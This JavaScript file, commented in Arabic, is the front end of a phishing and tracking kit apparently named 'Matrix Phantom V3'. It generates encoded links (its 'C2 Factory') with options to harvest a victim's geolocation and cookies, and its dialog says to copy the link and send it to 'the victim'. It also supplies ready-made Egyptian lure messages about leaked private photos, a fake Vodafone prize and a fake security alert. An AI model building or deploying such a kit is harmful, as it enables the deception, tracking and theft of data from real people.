// --- MATRIX PHANTOM V3 - CORE ENGINE ---

// 1. الثوابت الأساسية
const SECRET_KEY = "01224815487"; // مفتاح التشفير (رقمك)
const ADMIN_CODE = "matrixjo";    // كود الدخول للوحة الشبح

// 2. نظام التنقل بين الأقسام (Tabs)
function openTab(tabId) {
    const contents = document.querySelectorAll('.tab-content');
    const buttons = document.querySelectorAll('.tab-btn');
    
    contents.forEach(content => content.classList.remove('active'));
    buttons.forEach(btn => btn.classList.remove('active'));
    
    document.getElementById(tabId).classList.add('active');
    event.currentTarget.classList.add('active');
}

// 3. مراقبة مدخلات التوكن (البوابة الشبح)
document.getElementById('target-token').addEventListener('input', function(e) {
    if (e.target.value.trim() === ADMIN_CODE) {
        document.getElementById('admin-dashboard').style.display = 'block';
        Swal.fire({
            title: 'Welcome Back, Matrix',
            text: 'تم تفعيل وضع الأدمن الماستر',
            icon: 'success',
            background: '#000',
            color: '#00ff41',
            confirmButtonColor: '#00ff41'
        });
        loadAdminData(); // وظيفة موجودة في admin.js لجلب البيانات
    }
});

function closeAdmin() {
    document.getElementById('admin-dashboard').style.display = 'none';
    document.getElementById('target-token').value = '';
}

// 4. نظام التشفير (XOR Encryption) للحماية
function matrixEncrypt(data) {
    let result = "";
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length));
    }
    return btoa(unescape(encodeURIComponent(result))); // تشفير Base64 متوافق مع الروابط
}

// 5. صناعة الرابط المشفر (C2 Factory)
function buildPhantomLink() {
    const token = document.getElementById('target-token').value;
    const cid = document.getElementById('target-id').value;
    
    if (!token || !cid) {
        return Swal.fire('بيانات ناقصة', 'يرجى إدخال التوكن والـ ID', 'error');
    }

    // تجهيز الخيارات
    const options = {
        t: token,
        i: cid,
        d: document.getElementById('opt-destruct').checked,
        g: document.getElementById('opt-geo').checked,
        c: document.getElementById('opt-cookies').checked,
        ts: Date.now()
    };

    const payload = matrixEncrypt(JSON.stringify(options));
    const finalLink = `${window.location.origin}/p.html?m=${payload}`;

    Swal.fire({
        title: 'تم التشفير بنجاح! 💀',
        html: `
            <p style="font-size:12px; color:#888;">انسخ الرابط وارسله للضحية:</p>
            <input type="text" value="${finalLink}" id="copy-link" readonly 
            style="width:100%; padding:12px; background:#000; color:#00ff41; border:1px solid #00ff41; text-align:center; border-radius:8px;">
        `,
        showCancelButton: true,
        confirmButtonText: 'نسخ الرابط',
        cancelButtonText: 'إغلاق',
        confirmButtonColor: '#00ff41'
    }).then((result) => {
        if (result.isConfirmed) {
            const copyText = document.getElementById("copy-link");
            copyText.select();
            document.execCommand("copy");
            Swal.fire('تم النسخ!', '', 'success');
        }
    });
}

// 6. ذكاء اصطناعي بسيط لتوليد نصوص الإقناع
function askAIForDraft() {
    const drafts = [
        "عاجل: تم تسريب صورك الخاصة على هذا الرابط، امسحها فوراً!",
        "مبروك! لقد فزت بـ 5000 وحدة إنترنت مجانية من فودافون، فعلها من هنا:",
        "تحذير أمني: شخص ما يحاول الدخول لحسابك من المنصورة، تأكد من هويتك:",
        "شاهد بث مباشر لمباراة الأهلي والزمالك الآن بدون تقطيع:"
    ];
    const random = drafts[Math.floor(Math.random() * drafts.length)];
    Swal.fire({
        title: 'اقتراح الذكاء الاصطناعي',
        text: random,
        confirmButtonText: 'استخدام النص'
    });
}

// 7. شاشة التحميل
window.onload = () => {
    setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
    }, 1500);
};
